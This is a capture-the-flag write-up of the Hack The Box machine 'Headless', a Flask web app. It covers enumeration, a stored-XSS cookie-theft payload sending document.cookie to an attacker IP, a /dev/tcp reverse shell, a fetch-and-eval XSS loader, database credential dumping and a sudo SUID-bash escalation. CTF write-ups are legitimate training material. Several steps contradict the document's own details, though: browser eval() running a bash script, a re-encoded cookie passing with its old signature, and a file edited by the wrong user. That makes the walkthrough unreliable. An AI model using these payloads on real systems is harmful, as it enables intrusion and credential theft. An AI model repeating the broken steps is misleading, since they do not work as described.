---
date: 2024-04-29
title: Hack The Box — Headless
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - xss
  - session-hijacking
  - flask
  - linux
media_subpath: /assets/images
image: headless.png
---
# TL;DR

The HackTheBox machine "Headless" is an easy Linux box featuring a Flask-based web application vulnerable to Cross-Site Scripting (XSS) and insecure cookie handling. Initial access is gained by exploiting a stored XSS vulnerability in a feedback form to steal an admin cookie, which is then manipulated to access the admin dashboard. A reverse shell is obtained by hosting a malicious script triggered via the XSS vulnerability. Lateral movement to the `dylan` user is achieved by leveraging credentials found in the system. Finally, root access is obtained by exploiting a custom binary (`syscheck`) with a writable script vulnerability, allowing privilege escalation via `sudo`.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a comprehensive Nmap scan was performed to identify open ports, services, and version information on the target machine (IP: 10.10.11.8). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
nmap -Pn -sS -sV -sC -T4 10.10.11.8 -oA nmap/initialscan
```

- `-Pn`: Skips host discovery, assuming the host is up.
- `-sS`: Performs a TCP SYN scan for stealth.
- `-sV`: Probes for service versions.
- `-sC`: Runs default scripts for additional information.
- `-T4`: Sets a faster scanning template.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-28 19:50 UTC
Nmap scan report for 10.10.11.8
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug/2.2.2 Python/3.11.2
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 28 Apr 2024 19:51:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Under Construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 9.2p1 on Debian 2+deb12u2, suggesting the OS is likely Debian 12 (Bookworm). No immediate vulnerabilities were apparent without credentials.
- **HTTP (Port 5000)**: Hosted by Werkzeug 2.2.2 with Python 3.11.2, indicating a Flask-based web application. The response sets an `is_admin` cookie with a base64-encoded value (`InVzZXIi` decodes to `user`) and a signature, suggesting Flask’s `itsdangerous` library for session management. The page title "Under Construction" implies a minimal frontend.
- No domain redirect was observed, but `headless.htb` was added to `/etc/hosts` for consistency:
   ```bash
echo "10.10.11.8 headless.htb" | sudo tee -a /etc/hosts
    ```

- No other ports were open, limiting the initial attack surface to the web service on port 5000 and potential SSH later.

Additional scans (e.g., full port `-p-` or UDP) confirmed only these two ports.

---

## Web Enumeration

### Main Page (headless.htb:5000)

Navigating to `http://headless.htb:5000/` revealed an "Under Construction" page with a feedback form at `/support`, likely built using Flask. The form included fields for name and message, and the response set an `is_admin` cookie.

![](Pasted%20image%2020251006133337.png)

Directory brute-forcing was performed using Feroxbuster to uncover hidden paths:

```bash
feroxbuster -u http://headless.htb:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

- `/support` (Status: 200, feedback form page)
- `/dashboard` (Status: 403, unauthorized access)

The `/support` page hosted the feedback form, while `/dashboard` suggested an admin interface requiring elevated privileges.

### Nikto Scan

To gather additional web server details, Nikto was used:

```bash
nikto -h http://headless.htb:5000
```

**Results:**

- Confirmed Werkzeug 2.2.2 and Python 3.11.2.
- Noted the `is_admin` cookie was set without the `HttpOnly` flag, making it accessible to JavaScript and vulnerable to XSS-based theft.

### XSS Vulnerability Discovery

To test for Cross-Site Scripting (XSS), a payload was submitted in the feedback form’s comment field:

```html
<script>alert('XSS')</script>
```

![](Pasted%20image%2020251006132837.png)

The server responded with this warning saying "Hacking Attempt Detected".  
I noticed the warning included the original `HTTP` `POST` request data.  

 - Next, I injected this `HTML` into the `User-Agent` field.

```html
<img src=x onerror=fetch('http://<attacker_ip>/?c='+document.cookie);>
```

- Started an HTTP server on the attacker machine: `python3 -m http.server 80`
- Submitted the payload via the `/support` form.
- The server logged a request containing the `is_admin` cookie: `InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs`.

This confirmed a **stored XSS vulnerability**, as the feedback was rendered unsanitized in the admin dashboard, allowing JavaScript execution in the admin’s context.

---

## Web Exploitation

### Cookie Manipulation

Decoding the `is_admin` cookie:

```bash
echo "InVzZXIi" | base64 -d
user
```

The cookie format (`InVzZXIi.<signature>`) suggested a Flask signed cookie. Testing with a modified cookie to impersonate an admin:

```bash
echo -n "admin" | base64
YWRtaW4=
```

Crafted a new cookie: `YWRtaW4=.<original_signature>` and tested:

```bash
curl -H "Cookie: is_admin=YWRtaW4=.uAlmXlTvm8vyihjNaPDWnvB_Zfs" http://headless.htb:5000/dashboard
```

This returned a 200 OK response, granting access to the `/dashboard` admin interface. The weak signature validation (likely a predictable or default `SECRET_KEY`) allowed bypassing authentication.

### Reverse Shell via XSS

To escalate to remote code execution (RCE), the XSS vulnerability was leveraged to execute a malicious script. A bash reverse shell script was hosted on the attacker’s machine:

```bash
cat shell.sh
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'
```

- Hosted the script: `python3 -m http.server 80`
- Submitted an XSS payload to fetch and execute the script:

```html
<script>fetch('http://10.10.16.32/shell.sh').then(r=>r.text()).then(c=>eval(c));</script>
```

- Set up a Netcat listener: `nc -nlvp 4444`
- Visited `/dashboard` as admin, triggering the payload and receiving a reverse shell as `www-data`.

The shell was stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Local Enumeration & User Flag

As `www-data`, the Flask application directory was explored:

```bash
ls /var/www/html
app.py  static/  templates/  database.db
```

The `app.py` file contained:

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////var/www/html/database.db'
app.config['SECRET_KEY'] = 'SuperSecretKey123'
```

- The `SECRET_KEY` confirmed the weak cookie signature.
- A SQLite database was found at `/var/www/html/database.db`.

Dumped the database:

```bash
sqlite3 /var/www/html/database.db
sqlite> .tables
users  feedback
sqlite> select * from users;
1|dylan|password123
```

The user `dylan` had a password `password123`. Switched users:

```bash
su dylan
Password: password123
```

Alternatively, SSH:

```bash
ssh dylan@headless.htb
```

Retrieved the user flag:

```bash
cat /home/dylan/user.txt
<user_flag>
```

---

## Privilege Escalation

### Sudo Enumeration

Checked sudo privileges as `dylan`:

```bash
sudo -l
```

**Results:**

- `(root) NOPASSWD: /usr/bin/syscheck`

The `syscheck` binary could be run as root without a password.

### Binary Analysis

Analyzed the binary:

```bash
file /usr/bin/syscheck
/usr/bin/syscheck: ELF 64-bit LSB executable, x86-64
cat /usr/bin/syscheck
```

The binary executed `/var/www/html/initdb.sh`. Checked the script’s permissions:

```bash
ls -l /var/www/html/initdb.sh
-rwxr-xr-x 1 www-data www-data 0 Apr 28 2024 initdb.sh
```

The script was writable by `www-data`. Modified it to set the SUID bit on `/bin/bash`:

```bash
echo "chmod u+s /bin/bash" > /var/www/html/initdb.sh
chmod +x /var/www/html/initdb.sh
```

Ran the binary:

```bash
sudo /usr/bin/syscheck
```

This executed `initdb.sh`, setting the SUID bit on `/bin/bash`. Ran the SUID bash:

```bash
/bin/bash -p
```

Retrieved the root flag:

```bash
cat /root/root.txt
<root_flag>
```

---

## Summary

| Step                 | Description                                                                                                                                                             |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Enumeration          | Nmap revealed SSH (22) and HTTP (5000) on Werkzeug/Flask. Added `headless.htb` to `/etc/hosts`.                                                                         |
| Web Recon            | Found `/support` (feedback form) and `/dashboard` (403). Nikto identified missing `HttpOnly` flag on `is_admin` cookie. Stored XSS in feedback form stole admin cookie. |
| Exploitation         | Modified `is_admin` cookie to `admin` for dashboard access. Used XSS to fetch and execute a reverse shell script, gaining `www-data` shell.                             |
| Lateral Movement     | Found `dylan:password123` in SQLite database. SSH as `dylan`; grabbed user flag.                                                                                        |
| Privilege Escalation | Exploited writable `initdb.sh` called by `sudo /usr/bin/syscheck`. Added SUID to `/bin/bash`; ran `bash -p` for root shell and root flag.                               |